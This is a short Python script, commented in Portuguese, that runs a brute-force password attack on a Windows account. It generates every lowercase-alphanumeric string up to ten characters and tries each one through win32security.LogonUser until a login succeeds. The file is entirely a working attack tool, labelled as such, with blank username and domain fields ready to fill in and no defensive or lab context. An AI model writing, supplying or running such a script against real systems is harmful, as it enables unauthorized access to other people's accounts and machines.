import win32security
import pywintypes
from itertools import product
import string

# Configurações
username = ''
domain = ''
characters = string.ascii_lowercase + string.digits
max_length = 10

def try_login(username, password, domain):
    """
    Tenta autenticar no sistema Windows com as credenciais fornecidas.

    :param username: Nome do usuário
    :param password: Senha
    :param domain: Domínio ou nome do computador
    :return: True se a autenticação for bem-sucedida, False caso contrário
    """
    try:
        handle = win32security.LogonUser(
            username,
            domain,
            password,
            win32security.LOGON32_LOGON_INTERACTIVE,
            win32security.LOGON32_PROVIDER_DEFAULT
        )
        handle.Close()
        return True
    except pywintypes.error as e:
        if e.winerror == 1326:  # Código de erro para falha de login
            return False
        else:
            raise e

def generate_passwords(characters, max_length):
    """
    Gera combinações de senhas usando os caracteres e o comprimento máximo fornecidos.

    :param characters: Caracteres a serem usados nas combinações de senha
    :param max_length: Comprimento máximo da senha
    :yield: Combinações de senha geradas
    """
    for length in range(1, max_length + 1):
        for password in product(characters, repeat=length):
            yield ''.join(password)

def brute_force(username, characters, max_length, domain):
    """
    Realiza um ataque de força bruta para encontrar a senha correta.

    :param username: Nome do usuário
    :param characters: Caracteres a serem usados nas combinações de senha
    :param max_length: Comprimento máximo da senha
    :param domain: Domínio ou nome do computador
    :return: A senha correta se encontrada, None caso contrário
    """
    for password in generate_passwords(characters, max_length):
        print(f'Tentando senha: {password}')
        if try_login(username, password, domain):
            print(f'Senha encontrada: {password}')
            return password
    print('Nenhuma senha encontrada.')
    return None

# Executar o ataque
brute_force(username, characters, max_length, domain)
